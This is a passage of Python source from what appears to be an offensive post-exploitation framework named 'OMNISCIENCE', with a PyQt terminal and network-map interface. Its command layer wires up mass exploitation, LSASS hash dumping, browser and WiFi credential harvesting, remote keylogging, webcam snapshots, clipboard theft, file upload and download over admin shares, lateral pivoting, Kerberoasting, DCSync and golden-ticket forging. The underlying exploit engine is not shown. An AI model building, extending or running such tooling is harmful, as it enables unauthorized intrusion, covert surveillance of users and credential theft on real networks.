            return self.show_modules()
        elif what == "sessions":
            return self.list_sessions()
        elif what == "creds":
            return self.list_credentials()
        elif what == "network":
            return self.show_network()
        elif what == "options":
            return self.show_options()
        else:
            return f"Unknown option: {what}"

    def show_modules(self):
        modules = [
            "Discovery & Recon:  scan, devices, info",
            "Exploitation:       pwn, pwnall",
            "Data Harvesting:    harvest, creds, wifi, lsass, vault",
            "Remote Control:     shell, exec, ls, cat, screenshot, processes, services",
            "Kerberoasting:      kerberoast, asreproast, dcsync, golden",
            "Database:           dbdump"
        ]
        return "\n".join(modules)

    def list_sessions(self):
        sessions = self.get_sessions()
        if not sessions:
            return "No active sessions."
        lines = [f"{'ID':<10} {'IP':<15} {'Platform':<10} {'User':<15} {'Created':<16}"]
        for s in sessions:
            sid = s.get('session_id','')[:8]
            ip = s.get('ip','')
            plat = s.get('platform','')
            user = s.get('username','')
            created = s.get('created','')
            lines.append(f"{sid:<10} {ip:<15} {plat:<10} {user:<15} {created:<16}")
        return "\n".join(lines)

    def list_credentials(self):
        if not self.credentials:
            return "No credentials stored."
        lines = ["Stored credentials:"]
        for target, cred in self.credentials.items():
            user = cred.get('user','')
            pwd = cred.get('pass','')
            domain = cred.get('domain','')
            lines.append(f"  {target} -> {domain}\\{user} : {pwd}")
        return "\n".join(lines)

    def show_network(self):
        devices = self.get_devices()
        if not devices:
            return "No devices discovered. Run 'scan' first."
        lines = [f"{'IP':<15} {'Hostname':<25} {'OS':<20} {'MAC':<18} {'Status':<10}"]
        for d in devices:
            ip = d.get('ip','')
            hostname = d.get('hostname','')[:25]
            os = d.get('os','')[:18]
            mac = d.get('mac','')
            status = "Compromised" if d.get('is_compromised') else "Discovered"
            lines.append(f"{ip:<15} {hostname:<25} {os:<20} {mac:<18} {status:<10}")
        return "\n".join(lines)

    def show_options(self):
        opts = []
        opts.append(f"Current target  : {self.current_target or 'Not set'}")
        opts.append(f"Variables       : {self.variables}")
        opts.append(f"Loaded modules  : {len(self.modules_loaded)}")
        opts.append(f"Sessions active : {len(self.sessions)}")
        opts.append(f"Credentials     : {len(self.credentials)}")
        return "\n".join(opts)

    def use_module(self, args):
        if not args:
            return "Usage: use <module> or use <target_ip>"
        module = args[0]
        if self._is_ip(module):
            self.current_target = module
            return f"Target set to {module}"
        else:
            self.current_module = module
            return f"Module set to: {module}"

    def info(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        info = self.get_system_info(target)
        return self.format_system_info(info)

    def back(self):
        self.current_module = None
        return "Back to main context."

    def interact_session(self, args):
        return "Interactive mode would open in a separate terminal window."

    def kill_session(self, args):
        if not args:
            return "Usage: kill <session_id>"
        sid = args[0]
        if sid in self.sessions:
            del self.sessions[sid]
            return f"Session {sid} terminated."
        return f"Session {sid} not found."

    def background_session(self):
        return "Session backgrounded (continues running)."

    def add_credential(self, args):
        if len(args) < 3:
            return "Usage: add_cred <target> <username> <password> [domain]"
        target = args[0]
        user = args[1]
        pwd = args[2]
        domain = args[3] if len(args) > 3 else ''
        super().add_credential(target, user, pwd, domain)
        return f"Credential added for {target}"

    # ─── Network ───
    def scan_network(self, args):
        target = args[0] if args else None
        result = self.discover_network(target_range=target, exhaustive=True)
        if 'error' in result:
            return f"[!] Scan error: {result['error']}"
        out = f"[+] Network scan: {result['count']} devices in {result['duration']:.2f}s\n"
        out += f"{'IP':<15} {'Hostname':<25} {'OS':<20}\n"
        out += "-"*60 + "\n"
        for dev in result['devices']:
            out += f"{dev.get('ip',''):<15} {dev.get('hostname','')[:25]:<25} {dev.get('os','')[:20]:<20}\n"
        return out

    def run_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            out = result.stdout or result.stderr
            return out.strip()
        except Exception as e:
            return f"Error: {e}"

    # ─── Real Control ───
    def shell(self, args):
        if not self.current_target:
            return "No target selected."
        cmd = " ".join(args)
        if not cmd:
            return "Usage: shell <command>"
        res = self.execute_command(self.current_target, cmd)
        return self._format_command_result(res)

    def download_file(self, args):
        if not self.current_target:
            return "No target selected."
        if not args:
            return "Usage: download <remote_path> [local_path]"
        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)
        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
        try:
            ok = self.control.smb_download(self.current_target, "C$", remote_path, local_path,
                                            creds['user'], creds['pass'])
            return f"[+] Downloaded {remote_path} to {local_path}" if ok else "[-] Download failed."
        except Exception as e:
            return f"[!] Download error: {e}"

    def upload_file(self, args):
        if not self.current_target:
            return "No target selected."
        if not args:
            return "Usage: upload <local_path> [remote_path]"
        local_path = args[0]
        remote_path = args[1] if len(args) > 1 else os.path.basename(local_path)
        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
        try:
            ok = self.control.smb_upload(self.current_target, local_path, "C$", remote_path,
                                          creds['user'], creds['pass'])
            return f"[+] Uploaded {local_path} to remote" if ok else "[-] Upload failed."
        except Exception as e:
            return f"[!] Upload error: {e}"

    def screenshot(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        path = self.take_screenshot(target)
        return f"[+] Screenshot saved: {path}" if path else "[-] Screenshot failed."

    def webcam(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
        try:
            path = self.control.take_webcam_snapshot(target, creds['user'], creds['pass'],
                                                     domain=creds.get('domain',''))
            return f"[+] Webcam image saved: {path}" if path else "[-] Webcam capture failed."
        except Exception as e:
            return f"[!] Webcam error: {e}"

    def keylogger(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
        try:
            self.control.wmi_keylogger_start(target, creds['user'], creds['pass'],
                                             domain=creds.get('domain',''))
            return f"[+] Keylogger started on {target}"
        except Exception as e:
            return f"[!] Keylogger start failed: {e}"

    def clipboard(self, args):
        if not args:
            return "Usage: clipboard <get|set> [text]"
        action = args[0].lower()
        if action == 'get':
            if not self.current_target:
                return "No target selected."
            cmd = 'powershell -NoProfile -Command "Get-Clipboard"'
            res = self.execute_command(self.current_target, cmd)
            return self._format_command_result(res)
        elif action == 'set':
            if len(args) < 2:
                return "Usage: clipboard set <text>"
            text = " ".join(args[1:])
            target = self.current_target
            if not target:
                return "No target selected."
            creds = self.credentials.get(target, {'user':'Administrator','pass':''})
            try:
                ok = self.control.set_clipboard(target, creds['user'], creds['pass'], text,
                                                domain=creds.get('domain',''))
                return "[+] Clipboard set." if ok else "[-] Clipboard set failed."
            except Exception as e:
                return f"[!] Clipboard error: {e}"
        else:
            return "Unknown clipboard action. Use 'get' or 'set'."

    def list_processes(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        processes = super().list_processes(target)
        if not processes:
            return "No process data or unavailable."
        lines = [f"{'PID':>7} {'Name':<30} {'Memory':>12} {'CommandLine'}"]
        for p in processes:
            pid = p.get('ProcessId',0)
            name = p.get('Name','')[:30]
            mem = p.get('WorkingSetSize',0)
            mem_mb = f"{mem//(1024*1024)}MB"
            cmd = p.get('CommandLine','')[:60]
            lines.append(f"{pid:>7} {name:<30} {mem_mb:>12} {cmd}")
        return "\n".join(lines)

    def kill_process(self, args):
        if not args:
            return "Usage: killproc <pid>"
        try:
            pid = int(args[0])
        except ValueError:
            return "Invalid PID."
        target = self.current_target
        if not target:
            return "No target selected."
        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
        try:
            ok = self.control.kill_process(target, creds['user'], creds['pass'], pid=pid)
            return "[+] Process killed." if ok else "[-] Failed to kill process."
        except Exception as e:
            return f"[!] Kill error: {e}"

    def registry(self, args):
        if not self.current_target:
            return "No target selected."
        if not args:
            return "Usage: registry <read|query> <key>  or  registry add <key> <valuename> <data> [type]"
        action = args[0].lower()
        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
        user, pwd = creds['user'], creds['pass']
        if action in ('read', 'query'):
            if len(args) < 2:
                return "Usage: registry read <key>"
            key = " ".join(args[1:])
            cmd = f'reg query "{key}"'
            res = self.execute_command(self.current_target, cmd)
            return self._format_command_result(res)
        elif action == 'add':
            if len(args) < 4:
                return "Usage: registry add <key> <valuename> <data> [REG_SZ|REG_DWORD]"
            key = args[1]
            vname = args[2]
            data = args[3]
            reg_type = args[4] if len(args) > 4 else 'REG_SZ'
            cmd = f'reg add "{key}" /v "{vname}" /t {reg_type} /d "{data}" /f'
            res = self.execute_command(self.current_target, cmd)
            return self._format_command_result(res)
        else:
            return f"Unknown registry action: {action}"

    def list_services(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
        try:
            services = self.control.list_services(target, creds['user'], creds['pass'],
                                                  domain=creds.get('domain',''))
            if not services:
                return "No services returned."
            lines = [f"{'Name':<40} {'State':<10} {'StartMode':<10} {'PathName'}"]
            for svc in services:
                name = svc.get('Name','')[:38]
                state = svc.get('State','')
                start = svc.get('StartMode','')
                path = svc.get('PathName','')[:40]
                lines.append(f"{name:<40} {state:<10} {start:<10} {path}")
            return "\n".join(lines)
        except Exception as e:
            return f"[!] Error listing services: {e}"

    def _control_service(self, args, action):
        if not args:
            return f"Usage: {action}_service <service_name>"
        svc = args[0]
        target = self.current_target
        if not target:
            return "No target selected."
        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
        try:
            ok = self.control.control_service(target, creds['user'], creds['pass'], svc, action,
                                              domain=creds.get('domain',''))
            return f"[+] Service {action} successful." if ok else f"[-] Service {action} failed."
        except Exception as e:
            return f"[!] Service error: {e}"

    def start_service(self, args):
        return self._control_service(args, 'start')

    def stop_service(self, args):
        return self._control_service(args, 'stop')

    def connect_target(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "No target specified."
        if not self.control:
            return "Control engine unavailable."
        try:
            result = self.control.get_shell_access(target)
            if result.get('access'):
                sid = f"shell_{target.replace('.','_')}_{int(time.time())}"
                self.sessions[sid] = {
                    'session_id': sid,
                    'ip': target,
                    'platform': result.get('platform','windows'),
                    'username': result.get('user','unknown'),
                    'privilege': 'system' if 'system' in result.get('method','').lower() else 'user',
                    'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'is_alive': True,
                    'connection_type': result.get('method','shell')
                }
                return f"[+] Shell access established to {target} via {result.get('method')}\\nSession: {sid}"
            else:
                return f"[-] Shell access failed: {result.get('message','Unknown error')}"
        except Exception as e:
            return f"[!] Connect error: {e}"

    def disconnect_target(self, args=None):
        if not self.current_target:
            return "No current target."
        to_delete = [sid for sid, s in self.sessions.items() if s.get('ip') == self.current_target]
        if not to_delete:
            return "No sessions for current target."
        for sid in to_delete:
            del self.sessions[sid]
        return f"[+] Disconnected {len(to_delete)} session(s) from {self.current_target}"

    def pivot(self, args):
        if not args:
            return "Usage: pivot <target_ip>"
        if not self.current_target:
            return "No source target selected."
        target = args[0]
        res = self.lateral_move(self.current_target, target)
        if res.get('success'):
            return f"[+] Pivot successful to {target} via {res.get('method')}"
        return f"[-] Pivot failed: {res.get('error','Unknown')}"

    def exploit_target_method(self, args):
        if args:
            target = args[0]
        elif self.current_target:
            target = self.current_target
        else:
            return "Usage: exploit <target_ip>"
        res = self.exploit_target(target)
        if res.get('success'):
            method = res.get('method','unknown')
            details = res.get('details',{})
            os = details.get('os','')
            return f"[+] EXPLOIT SUCCESSFUL! Access via {method}\\nTarget: {target} OS: {os}"
        return "[-] Exploit failed."

    def pwn_target(self, args):
        return self.exploit_target_method(args)

    def pwn_all(self, args):
        result = self.pwn_all_devices()
        if 'error' in result:
            return f"[!] {result['error']}"
        out = f"[+] Mass exploitation complete. Exploited: {len(result['exploited'])}, Failed: {len(result['failed'])}\\n"
        for exp in result['exploited']:
            out += f"  [+] {exp['ip']} - {exp['method']} ({exp['os']})\\n"
        if result['failed']:
            out += "  [-] Failed targets:\\n"
            for f in result['failed']:
                out += f"    {f}\\n"
        return out

    def dump_database(self, args):
        if len(args) < 2:
            return "Usage: dbdump <ip> <db_type> [port]"
        target = args[0]; db_type = args[1]; port = int(args[2]) if len(args)>2 else None
        if not self.control: return "Control engine unavailable."
        result = self.control.full_database_dump(target, port, db_type)
        if result.get("success"):
            return (f"[+] Database dump successful!\\nDatabases: {result.get('databases', [])}\\n"
                    f"Tables: {len(result.get('tables', []))}\\nRows: {result.get('total_rows', 0)}")
        return f"[-] Database dump failed: {result.get('error','Unknown')}"

    def kerberoast_attack(self, args):
        if not args:
            return "Usage: kerberoast <dc_ip> [domain]"
        dc = args[0]; domain = args[1] if len(args)>1 else "DOMAIN.LOCAL"
        if not self.control: return "Control engine unavailable."
        res = self.control.kerberoast(dc, domain)
        if res.get('success'):
            return f"[+] Kerberoasting successful! SPNs: {res.get('spn_count',0)}\\n" + "\\n".join(str(spn) for spn in res.get('spn_found',[]))
        return f"[-] Kerberoasting failed: {res.get('error','Unknown')}"

    def asreproast_attack(self, args):
        if not args:
            return "Usage: asreproast <dc_ip> [domain]"
        dc = args[0]; domain = args[1] if len(args)>1 else "DOMAIN.LOCAL"
        if not self.control: return "Control engine unavailable."
        res = self.control.asreproast(dc, domain)
        if res.get('success'):
            users = res.get('vulnerable_users', [])
            return f"[+] AS-REP roasting successful! Vulnerable users: {', '.join(users)}"
        return f"[-] AS-REP roasting failed: {res.get('error','Unknown')}"

    def dcsync_attack(self, args):
        if len(args) < 3:
            return "Usage: dcsync <dc_ip> <username> <password> [domain]"
        dc = args[0]; user = args[1]; pwd = args[2]; domain = args[3] if len(args)>3 else "DOMAIN.LOCAL"
        if not self.control: return "Control engine unavailable."
        res = self.control.dcsync(dc, user, pwd, domain=domain)
        if res.get('success'):
            return f"[+] DCSync replication initiated via {res.get('method')}"
        return f"[-] DCSync failed: {res.get('error','Unknown')}"

    def golden_ticket_attack(self, args):
        if len(args) < 3:
            return "Usage: golden <domain> <sid> <krbtgt_hash> [username]"
        domain = args[0]; sid = args[1]; krbtgt_hash = args[2]; username = args[3] if len(args)>3 else "Administrator"
        if not self.control: return "Control engine unavailable."
        path = self.control.golden_ticket(domain, sid, krbtgt_hash, username)
        return f"[+] Golden ticket forged: {path}" if path else "[-] Golden ticket creation failed."

    def dump_lsass(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "Usage: lsass <target_ip>"
        username = args[1] if len(args) > 1 else self.credentials.get(target,{}).get('user','Administrator')
        password = args[2] if len(args) > 2 else self.credentials.get(target,{}).get('pass','')
        self.credentials[target] = {'user': username, 'pass': password}
        res = super().dump_lsass(target)
        if res.get('success'):
            out = f"[+] LSASS extraction: {len(res.get('hashes',[]))} hashes\\n"
            for h in res.get('hashes',[]):
                out += f"  {h.get('user','?')}:{h.get('ntlm','?')}\\n"
            return out
        return f"[-] LSASS dump failed: {res.get('error','Unknown')}"

    def harvest_browser(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "Usage: browser <target_ip>"
        res = self.harvest_browser_creds(target)
        if res.get('passwords'):
            out = f"[+] Browser credentials:\\n"
            for cred in res['passwords']:
                out += f"  {cred.get('browser','?')}: {cred.get('url','?')} -> {cred.get('user','?')}\\n"
            return out
        return "[-] No browser credentials found."

    def harvest_wifi(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "Usage: wifi <target_ip>"
        res = self.harvest_wifi_keys(target)
        if res.get('networks'):
            out = f"[+] WiFi networks:\\n"
            for ssid, pwd in res['networks'].items():
                out += f"  {ssid}: {pwd}\\n"
            return out
        return "[-] No WiFi profiles found."

    def harvest_vault(self, args):
        target = args[0] if args else self.current_target
        if not target:
            return "Usage: vault <target_ip>"
        res = self.harvest_all_data(target)
        out = f"[+] Vault/harvest data from {target}:\\n"
        out += f"  Credentials: {len(res.get('credentials',{}).get('passwords',[]))}\\n"
        out += f"  WiFi: {len(res.get('wifi',{}).get('networks',{}))}\\n"
        out += f"  Hashes: {len(res.get('hashes',{}).get('hashes',[]))}\\n"
        return out

    def wmi_exec(self, args):
        return self.shell(args)

    def smb_list(self, args):
        path = args[0] if args else "C:\\\\"
        if not self.current_target:
            return "No target selected."
        files = self.smb_list_files(self.current_target, path)
        return self.format_file_list(files, path)

    def smb_read(self, args):
        if not args:
            return "Usage: cat <remote_file>"
        remote_path = args[0]
        if not self.current_target:
            return "No target selected."
        content = self.smb_read_file(self.current_target, remote_path)
        if content:
            return content.decode(errors='replace') if isinstance(content, bytes) else str(content)
        return "[-] Failed to read file."

    def _is_ip(self, s):
        parts = s.split('.')
        if len(parts) != 4:
            return False
        try:
            return all(0 <= int(p) <= 255 for p in parts)
        except:
            return False

    def _format_command_result(self, res):
        if res.get('success'):
            return res.get('output', '')
        err = res.get('error', 'Unknown error')
        out = res.get('output', '')
        return f"Error: {err}\\n{out}".strip()

    def format_system_info(self, info):
        if not info or 'error' in info:
            return info.get('error','No data') if info else "No data"
        lines = []
        for k, v in info.items():
            if v and v != 'N/A':
                lines.append(f"{k}: {v}")
        return "\\n".join(lines)

    def format_file_list(self, files, path):
        if not files:
            return f"Directory {path} is empty or inaccessible."
        out = f"Directory listing of {path}:\\n"
        out += f"{'Type':<4} {'Name':<40} {'Size':>12}\\n"
        out += "-"*60 + "\\n"
        for f in files:
            typ = '[D]' if f.get('dir') else '   '
            name = f.get('name','')[:38]
            size = f.get('size',0)
            size_str = f"{size:,}" if isinstance(size,(int,float)) else str(size)
            out += f"{typ} {name:<40} {size_str:>12}\\n"
        return out

    def send_message(self, args):
        if len(args) < 2:
            return "Usage: send_message <target> <message>"
        return f"[+] Message queued to {args[0]}"


# ==================== ADVANCED EXTERNAL TERMINAL ====================

class AdvancedTerminalWindow(QMainWindow):
    """Powerful standalone CLI interface window that clones a professional terminal experience"""
    
    def __init__(self, cli_manager):
        super().__init__()
        self.cli = cli_manager
        self.setWindowTitle("◈ OMNISCIENCE Framework - Advanced Shell ◈")
        self.setMinimumSize(1100, 750)
        self.history = []
        self.history_index = -1
        
        self.setup_ui()
        self.apply_theme()
        
    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(0)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Advanced Status Header - Cloned professional look
        status_header = QLabel(" [SHELL] omniscient@node-01 | TTY: pts/4 | KERNEL: 5.15.0-generic | STATUS: AUTHENTICATED ")
        status_header.setStyleSheet(f"background-color: {PURPLE}; color: {DARKER_BG}; font-family: Consolas; font-weight: bold; font-size: 11px; padding: 4px;")
        layout.addWidget(status_header)
        
        # High-Fidelity Terminal Output
        self.display = QTextEdit()
        self.display.setReadOnly(True)
        self.display.setFont(QFont("Consolas", 12))
        self.display.setStyleSheet(f"""
            QTextEdit {{
                background-color: #050505;
                color: #00ff88;
                border: 2px solid {ACCENT};
                padding: 20px;
                selection-background-color: {PURPLE};
                selection-color: white;
            }}
        """)
        layout.addWidget(self.display, 1)
        
        # Command Input Line
        input_frame = QFrame()
        input_frame.setStyleSheet(f"background-color: #080808; border-top: 2px solid {ACCENT};")
        input_layout = QHBoxLayout(input_frame)
        input_layout.setContentsMargins(15, 10, 15, 10)
        
        self.prompt_label = QLabel("omniscience»")
        self.prompt_label.setStyleSheet(f"color: {PURPLE}; font-family: Consolas; font-weight: bold; font-size: 14px;")
        input_layout.addWidget(self.prompt_label)
        
        self.input_line = QLineEdit()
        self.input_line.setFont(QFont("Consolas", 14))
        self.input_line.setStyleSheet("color: #ffffff; border: none; background: transparent;")
        self.input_line.returnPressed.connect(self.dispatch_command)
        input_layout.addWidget(self.input_line)
        
        layout.addWidget(input_frame)
        
        # Welcome Sequence
        self.display.append(f"<font color='{PURPLE}'><b>OMNISCIENCE ADVANCED TERMINAL v2.0</b></font>")
        self.display.append(f"<font color='{ACCENT}'><b>[GEMINI]</b></font> <font color='#666680'>Cloning interface from localized imaging assets...</font>")
        self.display.append(self.cli.get_banner())
        self.display.append(f"\n<font color='{SUCCESS}'>[READY] system is responsive.</font>\n")

    def apply_theme(self):
        self.setStyleSheet(f"QMainWindow {{ background-color: {DARKER_BG}; }}")

    def dispatch_command(self):
        cmd = self.input_line.text().strip()
        if not cmd: return
        
        self.history.append(cmd)
        self.history_index = len(self.history)
        
        self.display.append(f"<font color='{ACCENT}'><b>[cmd]</b></font> <font color='#ffffff'>{cmd}</font>")
        self.input_line.clear()
        
        result = self.cli.execute(cmd)
        if result == "CLEAR":
            self.display.clear()
            self.display.append(f"<font color='{PURPLE}'><b>OMNISCIENCE TERMINAL RESET.</b></font>\n")
        elif result == "EXIT":
            self.close()
        elif result:
            self.display.append(result)
            
        self.display.moveCursor(QTextCursor.MoveOperation.End)

    def keyPressEvent(self, event):
        if event.key() == Qt.Key.Key_Up:
            if self.history:
                self.history_index = max(0, self.history_index - 1)
                self.input_line.setText(self.history[self.history_index])
        elif event.key() == Qt.Key.Key_Down:
            if self.history:
                self.history_index = min(len(self.history) - 1, self.history_index + 1)
                self.input_line.setText(self.history[self.history_index])
        super().keyPressEvent(event)


# ==================== NETWORK VISUALIZATION ====================

class NetworkNode:
    """Represents a node in the network topology"""
    def __init__(self, ip, hostname="", mac="", os="", ports=None, status="unknown", node_type="host", vendor=""):
        self.ip = ip
        self.hostname = hostname
        self.mac = mac
        self.os = os
        self.vendor = vendor
        self.ports = ports or []
        self.status = status  # online, offline, unknown
        self.node_type = node_type  # host, router, server, gateway
        self.x = 0
        self.y = 0
        self.connections = []
        self.messages = []  # Real-time messages between nodes
        self.last_seen = time.time()

class NetworkConnection:
    """Represents a connection between nodes"""
    def __init__(self, from_ip, to_ip, protocol="TCP", port=0, status="active"):
        self.from_ip = from_ip
        self.to_ip = to_ip
        self.protocol = protocol
        self.port = port
        self.status = status
        self.bytes_sent = 0
        self.bytes_received = 0
        self.timestamp = time.time()

class NetworkGraphicsScene(QGraphicsScene):
    """Custom graphics scene for network topology visualization with real connections"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setSceneRect(0, 0, 1200, 800)
        self.nodes = {}
        self.node_items = {}
        self.edge_items = []
        self.connection_items = []
        self.selected_node = None
        self.message_animations = []
        
    def add_node(self, node):
        """Add a network node to the scene"""
        self.nodes[node.ip] = node
        
        # Calculate position - arrange in circular layout
        n = len(self.nodes)
        if n > 0:
            import math
            angle = (n - 1) * (360 / max(10, n)) * (math.pi / 180)
            radius = 250
            center_x, center_y = 600, 400
            node.x = center_x + radius * (1 if n <= 5 else -1) * abs(math.cos(angle))
            node.y = center_y + radius * math.sin(angle)
        
        # Create graphics item
        item = NetworkNodeItem(node)
        self.node_items[node.ip] = item
        self.addItem(item)
        
    def update_positions(self):
        """Update node positions in a nice layout"""
        n = len(self.nodes)
        if n == 0:
            return
            
        import math
        center_x, center_y = 600, 400
        radius = min(250, max(100, n * 30))
        
        for i, ip in enumerate(self.nodes):
            angle = i * (360 / n) * (math.pi / 180)
            node = self.nodes[ip]
            node.x = center_x + radius * math.cos(angle)
            node.y = center_y + radius * math.sin(angle)
            
            if ip in self.node_items:
                self.node_items[ip].setPos(node.x, node.y)
                
        self.update_edges()
        
    def add_edge(self, from_ip, to_ip, protocol="TCP", port=0):
        """Add a connection between nodes"""
        if from_ip in self.nodes and to_ip in self.nodes:
            # Create connection object
            conn = NetworkConnection(from_ip, to_ip, protocol, port)
            self.nodes[from_ip].connections.append(conn)
            self.update_edges()
            
    def update_edges(self):
        """Update edge positions with real connection data"""
        # Remove old edges
        for edge in self.edge_items:
            self.removeItem(edge)
        self.edge_items = []
        
        # Draw new edges with connection info
        for ip, node in self.nodes.items():
            for conn in node.connections:
                if conn.to_ip in self.node_items:
                    # Determine line style based on status
                    if conn.status == "active":
                        pen = QPen(QColor(SUCCESS), 2, Qt.PenStyle.SolidLine)
                    elif conn.status == "listening":
                        pen = QPen(QColor(WARNING), 2, Qt.PenStyle.DashLine)
                    else:
                        pen = QPen(QColor(TEXT_DIM), 1, Qt.PenStyle.DashLine)
                    
                    line = QGraphicsLineItem(
                        self.node_items[ip].pos().x(),
                        self.node_items[ip].pos().y(),
                        self.node_items[conn.to_ip].pos().x(),
                        self.node_items[conn.to_ip].pos().y()
                    )
                    line.setPen(pen)
                    self.addItem(line)
                    self.edge_items.append(line)
                    
                    # Add connection label
                    mid_x = (self.node_items[ip].pos().x() + self.node_items[conn.to_ip].pos().x()) / 2
                    mid_y = (self.node_items[ip].pos().y() + self.node_items[conn.to_ip].pos().y()) / 2
                    
                    label = QGraphicsTextItem(f"{conn.protocol}:{conn.port}")
                    label.setDefaultTextColor(QColor(TEXT_DIM))
                    label.setPos(mid_x, mid_y)
                    self.addItem(label)
                    self.edge_items.append(label)

    def add_message(self, from_ip, to_ip, message):
        """Add a message visualization between nodes"""
        if from_ip in self.nodes and to_ip in self.nodes:
            msg_data = {
                'from': from_ip,
                'to': to_ip,
                'message': message,
                'time': datetime.now().strftime("%H:%M:%S")
            }
            self.nodes[from_ip].messages.append(msg_data)
            # Animation would be handled here

class NetworkNodeItem(QGraphicsEllipseItem):
    """Graphics item representing a network node with real status"""
    
    def __init__(self, node, parent=None):
        self.node = node
        super().__init__(-30, -30, 60, 60, parent)
        
        # Styling based on status and type
        if node.status == "online":
            if node.node_type == "gateway":
                self.setBrush(QBrush(QColor(CYAN)))
            elif node.node_type == "server":
                self.setBrush(QBrush(QColor(PURPLE)))
            else:
                self.setBrush(QBrush(QColor(SUCCESS)))
        elif node.status == "offline":
            self.setBrush(QBrush(QColor(ERROR)))
        elif node.status == "compromised":
            self.setBrush(QBrush(QColor(ACCENT2)))
        else:
            self.setBrush(QBrush(QColor(WARNING)))
            
        self.setPen(QPen(QColor(ACCENT), 2))
        self.setFlag(QGraphicsItem.GraphicsItemFlag.ItemIsSelectable, True)
        self.setFlag(QGraphicsItem.GraphicsItemFlag.ItemIsMovable, True)
        
    def paint(self, painter, option, widget):
        """Custom paint with node type indicators"""
        painter.setBrush(self.brush())
        painter.setPen(self.pen())
        
        # Draw different shapes based on node type
        if self.node.node_type == "gateway":
            # Diamond for gateway
            painter.drawPolygon([
                QPointF(0, -30),
                QPointF(30, 0),
                QPointF(0, 30),
                QPointF(-30, 0)
            ])
        elif self.node.node_type == "server":
            # Square for server
            painter.drawRect(self.rect())
        else:
            # Circle for hosts
            painter.drawEllipse(self.rect())
        
        # Draw IP address
        painter.setPen(QPen(QColor(TEXT)))
        font = QFont("Consolas", 8)
        painter.setFont(font)
        painter.drawText(QPointF(-25, 45), self.node.ip[:15])
        
        # Draw hostname if available
        if self.node.hostname:
            painter.drawText(QPointF(-25, 55), self.node.hostname[:15])
        
        # Draw status indicator (small dot)
        if self.node.status == "online":
            painter.setBrush(QBrush(QColor(SUCCESS)))
            painter.setPen(QPen(QColor(SUCCESS)))
            painter.drawEllipse(QRectF(20, -30, 8, 8))
        elif self.node.status == "compromised":
            painter.setBrush(QBrush(QColor(ACCENT2)))
            painter.setPen(QPen(QColor(ACCENT2)))
            painter.drawEllipse(QRectF(20, -30, 8, 8))

# ==================== BACKGROUND THREADS ====================

class CommandExecutor(QThread):
    """Background thread for executing commands"""
    output = pyqtSignal(str)
    finished = pyqtSignal()
    error = pyqtSignal(str)
    
    def __init__(self, command, parent=None):
        super().__init__(parent)
        self.command = command
        
    def run(self):
        try:
            result = subprocess.run(
                self.command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            self.output.emit(output if output else "Command executed successfully.")
            self.finished.emit()
        except subprocess.TimeoutExpired:
            self.error.emit("Command timed out.")
            self.finished.emit()
        except Exception as e:
            self.error.emit(f"Error: {str(e)}")
            self.finished.emit()

class ScannerThread(QThread):
    """Background thread for network scanning with real results"""
    progress = pyqtSignal(int, str)
    host_found = pyqtSignal(dict)
    connection_found = pyqtSignal(str, str, str, int)
    finished = pyqtSignal()
    
    def __init__(self, targets, ports=None, parent=None):
        super().__init__(parent)
        self.targets = targets
        # Default scan ports (comprehensive - 1000+ ports)
        self.ports = ports or list(range(1, 1001)) + [1433, 1521, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8000, 8080, 8081, 8443, 8888, 9090, 9200, 9300, 10000, 27017, 27018, 27019, 28017]
        self.arp_cache = {}
        self._build_arp_cache()
        
    def arp_scan_network(self, subnet):
        """Perform ARP scan to discover all devices on subnet"""
        discovered = []
        try:
            import subprocess
            # Send ARP to entire subnet
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                try:
                    # Use ARP to probe each IP
                    result = subprocess.run(f"ping -n 1 -w 100 {ip}", shell=True, capture_output=True)
                    if result.returncode == 0:
                        # Try to get ARP entry
                        arp_result = subprocess.run(f"arp -a {ip}", shell=True, capture_output=True, text=True, timeout=2)
                        for line in arp_result.stdout.split('\n'):
                            if ip in line:
                                parts = line.split()
                                for part in parts:
                                    if '-' in part or ':' in part:
                                        if len(part) == 17:
                                            discovered.append((ip, part.upper()))
                                            break
                except:
                    pass
        except:
            pass
        return discovered
    
    def netbios_scan(self, ip):
        """Scan NetBIOS for Windows hostnames"""
        try:
            import socket
            # Try to resolve NetBIOS name
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            # NetBIOS name query
            sock.sendto(b'\x81\x00\x00\x20', (ip, 137))
            data, addr = sock.recvfrom(1024)
            sock.close()
            
            if len(data) > 50:
                # Extract NetBIOS name
                name = data[57:57+32].decode('utf-8', errors='ignore').strip()
                return name if name else None
        except:
            pass
        return None
    
    def mdns_scan(self, ip):
        """Scan mDNS/Bonjour for Apple devices"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
